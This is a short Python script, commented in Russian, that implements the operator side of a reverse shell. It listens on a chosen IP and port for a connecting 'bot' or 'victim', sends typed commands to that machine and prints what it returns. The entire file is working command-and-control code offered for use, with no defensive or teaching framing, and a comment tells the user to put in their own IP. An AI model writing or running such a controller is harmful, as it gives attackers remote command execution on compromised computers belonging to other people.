import socket
import os, sys
import subprocess as sp

# Your data 
sniff_data = ('127.0.0.1', 11719) # В реальных условиях вы ставите ваш IP и любой совободный порт

# Data victim
connect = None
address = None

# Socket options
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def main():
    print("Waiting connect to " + str(sniff_data[1]))
    connect()
    command_handler(input("command> "))

# Функция, ожидающая присоединения бота
def connect():
    global connect, address, sock, sniff_data

    try:
        sock.bind(sniff_data)
        sock.listen(100)
        connect, address = sock.accept()
        print("Connected to " + str(address[0]))
    except:
        raise SystemExit

# Функция отправки сообщения на сервер
def send(message):
    connect.send(message.encode())

# Функция, которая отправит сообщение боту и вернет, полученный результат если он имеется
def execute_command(command):
    try:
        send(command)

        data = connect.recv(4096)
        data_length = data[:16].decode()

        if data_length and data.decode() != "except":
            total_size = int(data_length)
            data = data[16:]

            while total_size > len(data):
                result = connect.recv(4096)
                data += result

            result = data.decode().rstrip('\n')

            return result
        else:
            return "\n[~] Runtime error!"
    except:
        pass

# Основная функция, обрабатывающая команды
def command_handler(command):
    if command == "exit": # Закрываем шелл
        send("exit")
        connect.close()
        raise SystemExit

    elif command != "":
        result = execute_command(command) # Получаем ответ на сообщение в переменной command
        print(result)

    command_handler(input("command> "))

main()